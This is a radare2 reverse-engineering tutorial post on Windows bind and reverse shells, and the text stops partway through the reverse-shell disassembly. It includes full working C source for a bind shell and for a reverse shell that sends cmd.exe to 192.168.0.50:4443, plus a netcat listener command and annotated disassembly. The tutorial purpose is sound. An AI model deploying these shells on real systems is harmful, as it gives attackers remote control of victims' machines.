---
layout: post
title:  "Reverse engineering x64 binaries with Radare2 - 18 (Bind and reverse shells)"
tags: [reversing, c, radare]
featured_image_thumbnail: assets/images/radare2/radare2_18.png
featured_image: assets/images/radare2/radare2_18.png
---

#### "Shells" 

Today I wanto to introduce a small and simple idea, to complement what we've been learning on these past posts. 

We've been emulating protocols as well as defining new protocols ourselves, that's nice but what if we don't want no protocol at all, can we just dump a file or process output to a socket and make the whole thing more " automatic "

Actually yes, processes (input and output) can get "sent" over network sockets in both linux and windows systems. Bind and reverse shells are common concepts among the hacking lands.

So in this post I do not intend to teach you advanced reverse engineering conceptes or new radare2 features I just want to introduce you to the bind/reverse shell code and operation so you can implement it yourself or quickly identify it on the disasm. 

#### The bind shell 

What is a bind shell? Again when we talk about bind/reverse shells in terms of pentesting/hacking/exploiting and such a bind shell is a program or a piece of code that opens a port on the machine where it is executed and starts accepting connections there, once the client connection is accepted the program will provide "the client" with a _remote_ command line interface.

Shells like the bind-shell are used in pentesting and hacking in general to take over remote machines. bind/reverse shells can be used as the _payload_ of an exploit "weaponizing" it, so when it kicks in the "hacker" will get control of the machine. That is an easy but at the same time fundamental concept, you really need to have this very clear as if you are a pentester you'll always want to get a shell on the remote machine, that'll be one of your main goals for sure.

Plenty of bind / reverse shell shellcode is available online, as you already know we can insert that shellcode inside a simple C program  using the trick we previously showed, we can also generate som shellcode in many formats using platforms like the metasploit framework and such, but the key thing here is that we should be able to write our bind/reverse shell code ourselves and especially we must be able to identify it and understand it when reversing a program.

The following program is an example of a BIND shell written in C using the WINSOCK and WINDOWS libraries:
```C 
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib,"ws2_32")

void doShell(){

    // needed data structures
    WSADATA wsaData;
    SOCKET s1, s2;
    struct sockaddr_in hax;
    char ip_addr[16];
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;
    //command we want to run, any other command line program could be used, but we want to prompt a shell.
    char Process[] = "cmd.exe";
    //WSAStartup is needed for socket 
	WSAStartup(MAKEWORD(2, 2), &wsaData);
    //We can use socket() either 
    //so INET TCP socket 
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    port 4443 on all interfaces
	hax.sin_family = AF_INET;
	hax.sin_port = htons(4443);
	hax.sin_addr.s_addr = inet_addr("0.0.0.0");
    //bind the socket to the address:port 
    if(bind(s1,(SOCKADDR*)&hax, sizeof(hax)) == SOCKET_ERROR){
		    printf("error %d \n", WSAGetLastError());
			closesocket(s1);
			WSACleanup();
    }
    //now the port will be open 
	else if(listen(s1,10) == SOCKET_ERROR){
		    printf("error %d \n", WSAGetLastError());
			closesocket(s1);
			WSACleanup();
    }
    else{
        //we set up a new socket here
        s2 = accept(s1, NULL, NULL);

        // we'll  use s2 to SEND data ourselves to the client
        printf("connecting \n");
        // we get the processinfo struct ready
        memset(&sui, 0, sizeof(sui));
        sui.cb = sizeof(sui);
        sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        // this is the key concept here, all the input/output of the interaction with this proces will go from/to client socket
        sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s2;
        // we create the socket with that data
        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
        // we don't want the program to end after this, we want to keep the connection going until cmd.exe finishes
        WaitForSingleObject(pi.hProcess, INFINITE);
        // house cleaning
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        closesocket(s1);
        closesocket(s2);
        WSACleanup();
        printf("shell closed \n");
    }

}

int main(int argc, char* argv[]){

    printf("bind shell going on: \n");
    doShell();

}
```
So the program will open port 4443 TCP for listening on all interfaces, will accept connections there and prompt a cmd.exe shell.


The key concept here, is the StartupInfo structure, that gets passed to the CreateProcess call (as we just saw with the reverse shell)

That is the following:
```C
typedef struct _STARTUPINFOA {
  DWORD  cb;
  LPSTR  lpReserved;
  LPSTR  lpDesktop;
  LPSTR  lpTitle;
  DWORD  dwX;
  DWORD  dwY;
  DWORD  dwXSize;
  DWORD  dwYSize;
  DWORD  dwXCountChars;
  DWORD  dwYCountChars;
  DWORD  dwFillAttribute;
  DWORD  dwFlags;
  WORD   wShowWindow;
  WORD   cbReserved2;
  LPBYTE lpReserved2;
  HANDLE hStdInput;
  HANDLE hStdOutput;
  HANDLE hStdError;
} STARTUPINFOA, *LPSTARTUPINFOA;
```
And especially those three variables right there:

```
  HANDLE hStdInput;
  HANDLE hStdOutput;
  HANDLE hStdError;
```
Those are the handles that relate to the input and output of the created process. And the key thing here is that those handles are related to where the input/output of the program will be sent/get to/from 

If we place our (client) socket there... everything will go over the network instead of over a console window 

We also have other interesting properties such as the following:
```
  WORD   wShowWindow;
```
When set to 0 CreateProcess will NOT create a Window... that may be useful for you if you think about it...

```
[0x00401550]> pdf
/ (fcn) sym.doShell 656
|   sym.doShell (int arg_3ch, int arg_50h, int arg_58h, int arg_60h, int arg_80h, int arg_82h, int arg_84h, int arg_90h, int arg_230h, int arg_238h);
|           ; var int local_28h @ rbp-0x28
|           ; var int local_20h_2 @ rbp-0x20
|           ; var int local_18h @ rbp-0x18
|           ; arg int arg_3ch @ rbp+0x3c
|           ; arg int arg_50h @ rbp+0x50
|           ; arg int arg_58h @ rbp+0x58
|           ; arg int arg_60h @ rbp+0x60
|           ; arg int arg_80h @ rbp+0x80
|           ; arg int arg_82h @ rbp+0x82
|           ; arg int arg_84h @ rbp+0x84
|           ; arg int arg_90h @ rbp+0x90
|           ; arg int arg_230h @ rbp+0x230
|           ; arg int arg_238h @ rbp+0x238
|           ; var int local_20h @ rsp+0x20
|           ; var int local_28h_2 @ rsp+0x28
|           ; var int local_30h @ rsp+0x30
|           ; var int local_38h @ rsp+0x38
|           ; var int local_40h @ rsp+0x40
|           ; var int local_48h @ rsp+0x48
|           ; var int local_80h @ rsp+0x80
|           ; CALL XREF from 0x00401800 (sym.main)
|           0x00401550      55             push rbp
|           0x00401551      4881ecc00200.  sub rsp, 0x2c0
|           0x00401558      488dac248000.  lea rbp, [local_80h]        ; 0x80 ; 128
|           0x00401560      48b8636d642e.  movabs rax, 0x6578652e646d63
|           0x0040156a      488945d8       mov qword [local_28h], rax
|           0x0040156e      488d85900000.  lea rax, [arg_90h]          ; 0x90 ; 144
|           0x00401575      4889c2         mov rdx, rax
|           0x00401578      b902020000     mov ecx, 0x202              ; 514
|           0x0040157d      488b05fc6c00.  mov rax, qword sym.imp.WS2_32.dll_WSAStartup ; [0x408280:8]=0x84ae reloc.WS2_32.dll_WSAStartup
|           0x00401584      ffd0           call rax
|           0x00401586      c74424280000.  mov dword [local_28h_2], 0
|           0x0040158e      c74424200000.  mov dword [local_20h], 0
|           0x00401596      41b900000000   mov r9d, 0
|           0x0040159c      41b806000000   mov r8d, 6
|           0x004015a2      ba01000000     mov edx, 1
|           0x004015a7      b902000000     mov ecx, 2
|           0x004015ac      488b05c56c00.  mov rax, qword sym.imp.WS2_32.dll_WSASocketA ; [0x408278:8]=0x84a0 reloc.WS2_32.dll_WSASocketA
|           0x004015b3      ffd0           call rax
|           0x004015b5      488985380200.  mov qword [arg_238h], rax   ; [0x238:8]=-1 ; 568
|           0x004015bc      66c785800000.  mov word [arg_80h], 2       ; [0x80:2]=0xffff ; 2
|           0x004015c5      b95c110000     mov ecx, 0x115c
|           0x004015ca      488b05cf6c00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x4082a0:8]=0x84dc reloc.WS2_32.dll_htons
|           0x004015d1      ffd0           call rax
|           0x004015d3      668985820000.  mov word [arg_82h], ax      ; [0x82:2]=0xffff ; 130
|           0x004015da      488d0d1f2a00.  lea rcx, str.0.0.0.0        ; section..rdata ; 0x404000 ; "0.0.0.0"
|           0x004015e1      488b05c06c00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0x4082a8:8]=0x84e4 reloc.WS2_32.dll_inet_addr
|           0x004015e8      ffd0           call rax
|           0x004015ea      898584000000   mov dword [arg_84h], eax    ; [0x84:4]=-1 ; 132
|           0x004015f0      488d85800000.  lea rax, [arg_80h]          ; 0x80 ; 128
|           0x004015f7      488b8d380200.  mov rcx, qword [arg_238h]   ; [0x238:8]=-1 ; 568
|           0x004015fe      41b810000000   mov r8d, 0x10               ; 16
|           0x00401604      4889c2         mov rdx, rax
|           0x00401607      488b05826c00.  mov rax, qword sym.imp.WS2_32.dll_bind ; [0x408290:8]=0x84c6 reloc.WS2_32.dll_bind
|           0x0040160e      ffd0           call rax
|           0x00401610      83f8ff         cmp eax, 0xffffffffffffffff
|       ,=< 0x00401613      7538           jne 0x40164d
|       |   0x00401615      488b05546c00.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x408270:8]=0x848e reloc.WS2_32.dll_WSAGetLastError
|       |   0x0040161c      ffd0           call rax
|       |   0x0040161e      89c2           mov edx, eax
|       |   0x00401620      488d0de12900.  lea rcx, str.error__d       ; 0x404008 ; "error %d \n"
|       |   0x00401627      e81c170000     call sym.printf             ; int printf(const char *format)
|       |   0x0040162c      488b85380200.  mov rax, qword [arg_238h]   ; [0x238:8]=-1 ; 568
|       |   0x00401633      4889c1         mov rcx, rax
|       |   0x00401636      488b055b6c00.  mov rax, qword sym.imp.WS2_32.dll_closesocket ; [0x408298:8]=0x84ce reloc.WS2_32.dll_closesocket
|       |   0x0040163d      ffd0           call rax
|       |   0x0040163f      488b05226c00.  mov rax, qword sym.imp.WS2_32.dll_WSACleanup ; [0x408268:8]=0x8480 reloc.WS2_32.dll_WSACleanup
|       |   0x00401646      ffd0           call rax
|      ,==< 0x00401648      e989010000     jmp 0x4017d6
|      ||   ; JMP XREF from 0x00401613 (sym.doShell)
|      |`-> 0x0040164d      488b85380200.  mov rax, qword [arg_238h]   ; [0x238:8]=-1 ; 568
|      |    0x00401654      ba0a000000     mov edx, 0xa
|      |    0x00401659      4889c1         mov rcx, rax
|      |    0x0040165c      488b054d6c00.  mov rax, qword sym.imp.WS2_32.dll_listen ; [0x4082b0:8]=0x84f0 reloc.WS2_32.dll_listen
|      |    0x00401663      ffd0           call rax
|      |    0x00401665      83f8ff         cmp eax, 0xffffffffffffffff
|      |,=< 0x00401668      7538           jne 0x4016a2
|      ||   0x0040166a      488b05ff6b00.  mov rax, qword sym.imp.WS2_32.dll_WSAGetLastError ; [0x408270:8]=0x848e reloc.WS2_32.dll_WSAGetLastError
|      ||   0x00401671      ffd0           call rax
|      ||   0x00401673      89c2           mov edx, eax
|      ||   0x00401675      488d0d8c2900.  lea rcx, str.error__d       ; 0x404008 ; "error %d \n"
|      ||   0x0040167c      e8c7160000     call sym.printf             ; int printf(const char *format)
|      ||   0x00401681      488b85380200.  mov rax, qword [arg_238h]   ; [0x238:8]=-1 ; 568
|      ||   0x00401688      4889c1         mov rcx, rax
|      ||   0x0040168b      488b05066c00.  mov rax, qword sym.imp.WS2_32.dll_closesocket ; [0x408298:8]=0x84ce reloc.WS2_32.dll_closesocket
|      ||   0x00401692      ffd0           call rax
|      ||   0x00401694      488b05cd6b00.  mov rax, qword sym.imp.WS2_32.dll_WSACleanup ; [0x408268:8]=0x8480 reloc.WS2_32.dll_WSACleanup
|      ||   0x0040169b      ffd0           call rax
|     ,===< 0x0040169d      e934010000     jmp 0x4017d6
|     |||   ; JMP XREF from 0x00401668 (sym.doShell)
|     ||`-> 0x004016a2      488b85380200.  mov rax, qword [arg_238h]   ; [0x238:8]=-1 ; 568
|     ||    0x004016a9      41b800000000   mov r8d, 0
|     ||    0x004016af      ba00000000     mov edx, 0
|     ||    0x004016b4      4889c1         mov rcx, rax
|     ||    0x004016b7      488b05ca6b00.  mov rax, qword sym.imp.WS2_32.dll_accept ; [0x408288:8]=0x84bc reloc.WS2_32.dll_accept
|     ||    0x004016be      ffd0           call rax
|     ||    0x004016c0      488985300200.  mov qword [arg_230h], rax   ; [0x230:8]=-1 ; 560
|     ||    0x004016c7      488d0d452900.  lea rcx, str.connecting     ; 0x404013 ; "connecting "
|     ||    0x004016ce      e86d160000     call sym.puts               ; int puts(const char *s)
|     ||    0x004016d3      4889e8         mov rax, rbp
|     ||    0x004016d6      41b868000000   mov r8d, 0x68               ; 'h' ; 104
|     ||    0x004016dc      ba00000000     mov edx, 0
|     ||    0x004016e1      4889c1         mov rcx, rax
|     ||    0x004016e4      e867160000     call sym.memset             ; void *memset(void *s, int c, size_t n)
|     ||    0x004016e9      c74500680000.  mov dword [rbp], 0x68       ; 'h' ; 104
|     ||    0x004016f0      c7453c010100.  mov dword [arg_3ch], 0x101  ; 257
|     ||    0x004016f7      488b85300200.  mov rax, qword [arg_230h]   ; [0x230:8]=-1 ; 560
|     ||    0x004016fe      48894560       mov qword [arg_60h], rax    ; [0x60:8]=-1 ; '`' ; 96
|     ||    0x00401702      488b4560       mov rax, qword [arg_60h]    ; [0x60:8]=-1 ; '`' ; 96
|     ||    0x00401706      48894558       mov qword [arg_58h], rax    ; [0x58:8]=-1 ; 'X' ; 88
|     ||    0x0040170a      488b4558       mov rax, qword [arg_58h]    ; [0x58:8]=-1 ; 'X' ; 88
|     ||    0x0040170e      48894550       mov qword [arg_50h], rax    ; [0x50:8]=-1 ; 'P' ; 80
|     ||    0x00401712      488d45d8       lea rax, [local_28h]
|     ||    0x00401716      488d55e0       lea rdx, [local_20h_2]
|     ||    0x0040171a      4889542448     mov qword [local_48h], rdx
|     ||    0x0040171f      4889ea         mov rdx, rbp
|     ||    0x00401722      4889542440     mov qword [local_40h], rdx
|     ||    0x00401727      48c744243800.  mov qword [local_38h], 0
|     ||    0x00401730      48c744243000.  mov qword [local_30h], 0
|     ||    0x00401739      c74424280000.  mov dword [local_28h_2], 0
|     ||    0x00401741      c74424200100.  mov dword [local_20h], 1
|     ||    0x00401749      41b900000000   mov r9d, 0
|     ||    0x0040174f      41b800000000   mov r8d, 0
|     ||    0x00401755      4889c2         mov rdx, rax
|     ||    0x00401758      b900000000     mov ecx, 0
|     ||    0x0040175d      488b05646b00.  mov rax, qword sym.imp.KERNEL32.dll_CreateProcessA ; [0x4082c8:8]=0x8508 reloc.KERNEL32.dll_CreateProcessA
|     ||    0x00401764      ffd0           call rax
|     ||    0x00401766      488b45e0       mov rax, qword [local_20h_2]
|     ||    0x0040176a      baffffffff     mov edx, 0xffffffff         ; -1
|     ||    0x0040176f      4889c1         mov rcx, rax
|     ||    0x00401772      488b050f6c00.  mov rax, qword sym.imp.KERNEL32.dll_WaitForSingleObject ; [0x408388:8]=0x8702 reloc.KERNEL32.dll_WaitForSingleObje
|     ||    0x00401779      ffd0           call rax
|     ||    0x0040177b      488b45e0       mov rax, qword [local_20h_2]
|     ||    0x0040177f      4889c1         mov rcx, rax
|     ||    0x00401782      488b05376b00.  mov rax, qword sym.imp.KERNEL32.dll_CloseHandle ; [0x4082c0:8]=0x84fa reloc.KERNEL32.dll_CloseHandle
|     ||    0x00401789      ffd0           call rax
|     ||    0x0040178b      488b45e8       mov rax, qword [local_18h]
|     ||    0x0040178f      4889c1         mov rcx, rax
|     ||    0x00401792      488b05276b00.  mov rax, qword sym.imp.KERNEL32.dll_CloseHandle ; [0x4082c0:8]=0x84fa reloc.KERNEL32.dll_CloseHandle
|     ||    0x00401799      ffd0           call rax
|     ||    0x0040179b      488b85380200.  mov rax, qword [arg_238h]   ; [0x238:8]=-1 ; 568
|     ||    0x004017a2      4889c1         mov rcx, rax
|     ||    0x004017a5      488b05ec6a00.  mov rax, qword sym.imp.WS2_32.dll_closesocket ; [0x408298:8]=0x84ce reloc.WS2_32.dll_closesocket
|     ||    0x004017ac      ffd0           call rax
|     ||    0x004017ae      488b85300200.  mov rax, qword [arg_230h]   ; [0x230:8]=-1 ; 560
|     ||    0x004017b5      4889c1         mov rcx, rax
|     ||    0x004017b8      488b05d96a00.  mov rax, qword sym.imp.WS2_32.dll_closesocket ; [0x408298:8]=0x84ce reloc.WS2_32.dll_closesocket
|     ||    0x004017bf      ffd0           call rax
|     ||    0x004017c1      488b05a06a00.  mov rax, qword sym.imp.WS2_32.dll_WSACleanup ; [0x408268:8]=0x8480 reloc.WS2_32.dll_WSACleanup
|     ||    0x004017c8      ffd0           call rax
|     ||    0x004017ca      488d0d4e2800.  lea rcx, str.shell_closed   ; 0x40401f ; "shell closed "
|     ||    0x004017d1      e86a150000     call sym.puts               ; int puts(const char *s)
|     ||    ; JMP XREF from 0x0040169d (sym.doShell)
|     ||    ; JMP XREF from 0x00401648 (sym.doShell)
|     ``--> 0x004017d6      90             nop
|           0x004017d7      4881c4c00200.  add rsp, 0x2c0
|           0x004017de      5d             pop rbp
\           0x004017df      c3             ret
[0x00401550]>
```

```
|           0x00401596      41b900000000   mov r9d, 0
|           0x0040159c      41b806000000   mov r8d, 6
|           0x004015a2      ba01000000     mov edx, 1
|           0x004015a7      b902000000     mov ecx, 2
|           0x004015ac      488b05c56c00.  mov rax, qword sym.imp.WS2_32.dll_WSASocketA ; [0x408278:8]=0x84a0 reloc.WS2_32.dll_WSASocketA
|           0x004015b3      ffd0           call rax
|           0x004015b5      488985380200.  mov qword [arg_238h], rax   ; [0x238:8]=-1 ; 568
|           0x004015bc      66c785800000.  mov word [arg_80h], 2       ; [0x80:2]=0xffff ; 2
|           0x004015c5      b95c110000     mov ecx, 0x115c
|           0x004015ca      488b05cf6c00.  mov rax, qword sym.imp.WS2_32.dll_htons ; [0x4082a0:8]=0x84dc reloc.WS2_32.dll_htons
|           0x004015d1      ffd0           call rax
|           0x004015d3      668985820000.  mov word [arg_82h], ax      ; [0x82:2]=0xffff ; 130
|           0x004015da      488d0d1f2a00.  lea rcx, str.0.0.0.0        ; section..rdata ; 0x404000 ; "0.0.0.0"
|           0x004015e1      488b05c06c00.  mov rax, qword sym.imp.WS2_32.dll_inet_addr ; [0x4082a8:8]=0x84e4 reloc.WS2_32.dll_inet_addr
```
We can see an AF_INET STREAM socket being declared, by now we should already be familiar with those numbers (6,1,2)

So if we look closer, we can see 0.0.0.0 hardcoded there as well as a suspicious number being passed to htons, we can guess it's the port; 0x115c == 4443dec, so we have the port and the address, and 0.0.0.0 means "all addresses on the box"

Then a bind shows up

```
|           0x004015ea      898584000000   mov dword [arg_84h], eax    ; [0x84:4]=-1 ; 132
|           0x004015f0      488d85800000.  lea rax, [arg_80h]          ; 0x80 ; 128
|           0x004015f7      488b8d380200.  mov rcx, qword [arg_238h]   ; [0x238:8]=-1 ; 568
|           0x004015fe      41b810000000   mov r8d, 0x10               ; 16
|           0x00401604      4889c2         mov rdx, rax
|           0x00401607      488b05826c00.  mov rax, qword sym.imp.WS2_32.dll_bind ; [0x408290:8]=0x84c6 reloc.WS2_32.dll_bind
|           0x0040160e      ffd0           call rax
```
And as we see the previously created socket loaded with the declared network data gets sent into it, now we can assume that the program will listen there and perhaps accept connections.

And if everything went well, the listen() gets executed:

```
|      ||   ; JMP XREF from 0x00401613 (sym.doShell)
|      |`-> 0x0040164d      488b85380200.  mov rax, qword [arg_238h]   ; [0x238:8]=-1 ; 568
|      |    0x00401654      ba0a000000     mov edx, 0xa
|      |    0x00401659      4889c1         mov rcx, rax
|      |    0x0040165c      488b054d6c00.  mov rax, qword sym.imp.WS2_32.dll_listen ; [0x4082b0:8]=0x84f0 reloc.WS2_32.dll_listen
```
We see 0xA being passed to listen, 0xA == 10dec == a maximum of 10 connections will be accepted into that socket

Then accept() gets called 

```
|     ||`-> 0x004016a2      488b85380200.  mov rax, qword [arg_238h]   ; [0x238:8]=-1 ; 568
|     ||    0x004016a9      41b800000000   mov r8d, 0
|     ||    0x004016af      ba00000000     mov edx, 0
|     ||    0x004016b4      4889c1         mov rcx, rax
|     ||    0x004016b7      488b05ca6b00.  mov rax, qword sym.imp.WS2_32.dll_accept ; [0x408288:8]=0x84bc reloc.WS2_32.dll_accept
|     ||    0x004016be      ffd0           call rax 
```
The socket that is now listening gets passed as a parameter, as we are expecting to receive connections there, our "peer" will initiate the communication,

so accept will return a new socket, that would be used to send data to the client (from this program)

```
|     ||    0x004016e9      c74500680000.  mov dword [rbp], 0x68       ; 'h' ; 104
|     ||    0x004016f0      c7453c010100.  mov dword [arg_3ch], 0x101  ; 257
|     ||    0x004016f7      488b85300200.  mov rax, qword [arg_230h]   ; [0x230:8]=-1 ; 560
|     ||    0x004016fe      48894560       mov qword [arg_60h], rax    ; [0x60:8]=-1 ; '`' ; 96
|     ||    0x00401702      488b4560       mov rax, qword [arg_60h]    ; [0x60:8]=-1 ; '`' ; 96
|     ||    0x00401706      48894558       mov qword [arg_58h], rax    ; [0x58:8]=-1 ; 'X' ; 88
|     ||    0x0040170a      488b4558       mov rax, qword [arg_58h]    ; [0x58:8]=-1 ; 'X' ; 88
|     ||    0x0040170e      48894550       mov qword [arg_50h], rax    ; [0x50:8]=-1 ; 'P' ; 80
|     ||    0x00401712      488d45d8       lea rax, [local_28h]
|     ||    0x00401716      488d55e0       lea rdx, [local_20h_2]
|     ||    0x0040171a      4889542448     mov qword [local_48h], rdx
|     ||    0x0040171f      4889ea         mov rdx, rbp
|     ||    0x00401722      4889542440     mov qword [local_40h], rdx
|     ||    0x00401727      48c744243800.  mov qword [local_38h], 0
|     ||    0x00401730      48c744243000.  mov qword [local_30h], 0
|     ||    0x00401739      c74424280000.  mov dword [local_28h_2], 0
|     ||    0x00401741      c74424200100.  mov dword [local_20h], 1
|     ||    0x00401749      41b900000000   mov r9d, 0
|     ||    0x0040174f      41b800000000   mov r8d, 0
|     ||    0x00401755      4889c2         mov rdx, rax
|     ||    0x00401758      b900000000     mov ecx, 0
|     ||    0x0040175d      488b05646b00.  mov rax, qword sym.imp.KERNEL32.dll_CreateProcessA ; [0x4082c8:8]=0x8508 reloc.KERNEL32.dll_CreateProcessA
```
So that chunk of code may look complex to analyse, a lot of values being initialized there. We need to be aware of a couple of them:

First of all we see arg_230h, the var holding the new socked (for client communication)
```
|     ||    0x004016f0      c7453c010100.  mov dword [arg_3ch], 0x101  ; 257
|     ||    0x004016f7      488b85300200.  mov rax, qword [arg_230h]   ; [0x230:8]=-1 ; 560
|     ||    0x004016fe      48894560       mov qword [arg_60h], rax    ; [0x60:8]=-1 ; '`' ; 96
```
Being passed to CreateProcessA 
```
 ||    0x00401749      41b900000000   mov r9d, 0
 ||    0x0040174f      41b800000000   mov r8d, 0
 ||    0x00401755      4889c2         mov rdx, rax
 ||    0x00401758      b900000000     mov ecx, 0
 ||    0x0040175d      488b05646b00.  mov rax, qword sym.imp.KERNEL32.dll_CreateProcessA ; [0x4082c8:8]=0x8508 reloc.KERNEL32.dll_CreateProcessA
```
SO we can figure out that the process created will relate to the socket. 

But what does this has to do with reversing and such? Isn't that program just very very simple?

Here you have a small hint:
```c
[0x00401550]> pc
#define _BUFFER_SIZE 256
const uint8_t buffer[256] = {
  0x55, 0x48, 0x81, 0xec, 0xc0, 0x02, 0x00, 0x00, 0x48, 0x8d,
  0xac, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0xb8, 0x63, 0x6d,
  0x64, 0x2e, 0x65, 0x78, 0x65, 0x00, 0x48, 0x89, 0x45, 0xd8,
  0x48, 0x8d, 0x85, 0x90, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc2,
  0xb9, 0x02, 0x02, 0x00, 0x00, 0x48, 0x8b, 0x05, 0xfc, 0x6c,
  0x00, 0x00, 0xff, 0xd0, 0xc7, 0x44, 0x24, 0x28, 0x00, 0x00,
  0x00, 0x00, 0xc7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
  0x41, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x06, 0x00,
  0x00, 0x00, 0xba, 0x01, 0x00, 0x00, 0x00, 0xb9, 0x02, 0x00,
  0x00, 0x00, 0x48, 0x8b, 0x05, 0xc5, 0x6c, 0x00, 0x00, 0xff,
  0xd0, 0x48, 0x89, 0x85, 0x38, 0x02, 0x00, 0x00, 0x66, 0xc7,
  0x85, 0x80, 0x00, 0x00, 0x00, 0x02, 0x00, 0xb9, 0x5c, 0x11,
  0x00, 0x00, 0x48, 0x8b, 0x05, 0xcf, 0x6c, 0x00, 0x00, 0xff,
  0xd0, 0x66, 0x89, 0x85, 0x82, 0x00, 0x00, 0x00, 0x48, 0x8d,
  0x0d, 0x1f, 0x2a, 0x00, 0x00, 0x48, 0x8b, 0x05, 0xc0, 0x6c,
  0x00, 0x00, 0xff, 0xd0, 0x89, 0x85, 0x84, 0x00, 0x00, 0x00,
  0x48, 0x8d, 0x85, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8d,
  0x38, 0x02, 0x00, 0x00, 0x41, 0xb8, 0x10, 0x00, 0x00, 0x00,
  0x48, 0x89, 0xc2, 0x48, 0x8b, 0x05, 0x82, 0x6c, 0x00, 0x00,
  0xff, 0xd0, 0x83, 0xf8, 0xff, 0x75, 0x38, 0x48, 0x8b, 0x05,
  0x54, 0x6c, 0x00, 0x00, 0xff, 0xd0, 0x89, 0xc2, 0x48, 0x8d,
  0x0d, 0xe1, 0x29, 0x00, 0x00, 0xe8, 0x1c, 0x17, 0x00, 0x00,
  0x48, 0x8b, 0x85, 0x38, 0x02, 0x00, 0x00, 0x48, 0x89, 0xc1,
  0x48, 0x8b, 0x05, 0x5b, 0x6c, 0x00, 0x00, 0xff, 0xd0, 0x48,
  0x8b, 0x05, 0x22, 0x6c, 0x00, 0x00, 0xff, 0xd0, 0xe9, 0x89,
  0x01, 0x00, 0x00, 0x48, 0x8b, 0x85
};
[0x00401550]>
```
** netcat can be used here to connect to this bind shell. 


#### The reverse shell

The thing here is that some firewalls/siem stuff etc will block you from listening on a random port or will alert the user or something like that, so normally you do not want to use bind shells.

The alternative is a reverse shell: making the _attacker_ machine listen for connections on a port (nc -lvp  4443) and just _sending the shell there_

Here's the code, you'll see that is prettty similar: 
```C
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

// remember to include the winsock lib to the project 
#pragma comment(lib,"ws2_32")

void doShell(){
    // initialization
    WSADATA wsaData;
    SOCKET s1;
    struct sockaddr_in hax;
    char ip_addr[16];
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;
    char Process[] = "cmd.exe";

    // WSAStartup is needed as well
	WSAStartup(MAKEWORD(2, 2), &wsaData);
    // we'll only have one socket in here as we already know where we'll send the process 
    // WSASocket == socket 
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    // socket info
	hax.sin_family = AF_INET;
	hax.sin_port = htons(4443);
	hax.sin_addr.s_addr = inet_addr("192.168.0.50");
    // WSAConnect == connect() 
	if(WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR){
		    printf("error %d \n", WSAGetLastError());
			closesocket(s1);
			WSACleanup();
    }
    else{
        printf("connecting \n");
        // sui == processinfo 
        memset(&sui, 0, sizeof(sui));
        sui.cb = sizeof(sui);
        sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        // and we just send to the socket
        sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;
        // creating a process for cmd.exe, sending to s1 
        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
        // we want to keep it up until the user closes 
        WaitForSingleObject(pi.hProcess, INFINITE);
        // house cleaning
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        closesocket(s1);
        WSACleanup();
        printf("shell closed \n");
    }

}

int main(int argc, char* argv[]){

    printf("reverse shell going on: \n");

    doShell();

}
```
And here we have the disasm:

````
[0x00401550]> pdf
/ (fcn) sym.doShell 548
|   sym.doShell (int arg_3ch, int arg_50h, int arg_58h, int arg_60h, int arg_80h, int arg_82h, int arg_84h, int arg_90h, int arg_228h);
|           ; var int local_28h @ rbp-0x28
|           ; var int local_20h_2 @ rbp-0x20
|           ; var int local_18h @ rbp-0x18
|           ; arg int arg_3ch @ rbp+0x3c
|           ; arg int arg_50h @ rbp+0x50
|           ; arg int arg_58h @ rbp+0x58
|           ; arg int arg_60h @ rbp+0x60
|           ; arg int arg_80h @ rbp+0x80
|           ; arg int arg_82h @ rbp+0x82
|           ; arg int arg_84h @ rbp+0x84
|           ; arg int arg_90h @ rbp+0x90
|           ; arg int arg_228h @ rbp+0x228
|           ; var int local_20h @ rsp+0x20
|           ; var int local_28h_2 @ rsp+0x28
|           ; var int local_30h @ rsp+0x30
|           ; var int local_38h @ rsp+0x38
|           ; var int local_40h @ rsp+0x40
|           ; var int local_48h @ rsp+0x48
|           ; var int local_80h @ rsp+0x80
|           ; CALL XREF from 0x00401794 (sym.main)
|           0x00401550      55             push rbp
|           0x00401551      4881ecb00200.  sub rsp, 0x2b0
|           0x00401558      488dac248000.  lea rbp, [local_80h]        ; 0x80 ; 128
|           0x00401560      48b8636d642e.  movabs rax, 0x6578652e646d63
|           0x0040156a      488945d8       mov qword [local_28h], rax
|           0x0040156e      488d85900000.  lea rax, [arg_90h]          ; 0x90 ; 144
|           0x00401575      4889c2         mov rdx, rax
|           0x00401578      b902020000     mov ecx, 0x202              ; 514
|           0x0040157d      488b05f46c00.  mov rax, qword sym.imp.WS2_32.dll_WSAStartup ; [0x408278:8]=0x849c reloc.WS2_32.dll_WSAStartup
|           0x00401584      ffd0           call rax
|           0x00401586      c74424280000.  mov dword [local_28h_2], 0
|           0x0040158e      c74424200000.  mov dword [local_20h], 0
|           0x00401596      41b900000000   mov r9d, 0
|           0x0040159c      41b806000000   mov r8d, 6
